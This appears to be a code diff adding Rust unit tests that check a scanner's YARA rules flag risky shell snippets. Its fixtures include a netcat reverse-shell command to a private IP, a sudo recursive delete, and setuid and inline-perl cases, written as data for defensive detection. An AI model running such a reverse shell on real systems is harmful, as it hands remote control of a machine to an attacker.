@@ -235,4 +235,55 @@ mod tests {
             "$GITHUB_TOKEN should trigger YARA: {findings:?}"
         );
     }
+
+    #[test]
+    fn network_tool_exfil_triggers_yara() {
+        let rules = compiled();
+        let dir = tempdir().unwrap();
+        let file = dir.path().join("exfil.sh");
+        fs::write(&file, b"nc -e /bin/bash 10.0.0.1 4444").unwrap();
+        let findings = run_pass1(&file, Path::new("scripts/exfil.sh"), &rules).unwrap();
+        assert!(
+            findings.iter().any(|f| f.tool == "yara"),
+            "nc -e should trigger YARA: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn privilege_escalation_setuid_triggers_yara() {
+        let rules = compiled();
+        let fixture =
+            Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures/bad_privileged.sh");
+        let findings = run_pass1(&fixture, Path::new("scripts/bad_privileged.sh"), &rules).unwrap();
+        assert!(
+            findings.iter().any(|f| f.tool == "yara"),
+            "chmod +s should trigger YARA: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn privilege_escalation_sudo_triggers_yara() {
+        let rules = compiled();
+        let dir = tempdir().unwrap();
+        let file = dir.path().join("setup.sh");
+        fs::write(&file, b"sudo rm -rf /var/cache/apt").unwrap();
+        let findings = run_pass1(&file, Path::new("scripts/setup.sh"), &rules).unwrap();
+        assert!(
+            findings.iter().any(|f| f.tool == "yara"),
+            "sudo should trigger YARA: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn inline_interpreter_perl_triggers_yara() {
+        let rules = compiled();
+        let dir = tempdir().unwrap();
+        let file = dir.path().join("run.sh");
+        fs::write(&file, b"perl -e 'print \"hello\"'").unwrap();
+        let findings = run_pass1(&file, Path::new("scripts/run.sh"), &rules).unwrap();
+        assert!(
+            findings.iter().any(|f| f.tool == "yara"),
+            "perl -e should trigger YARA: {findings:?}"
+        );
+    }
 }
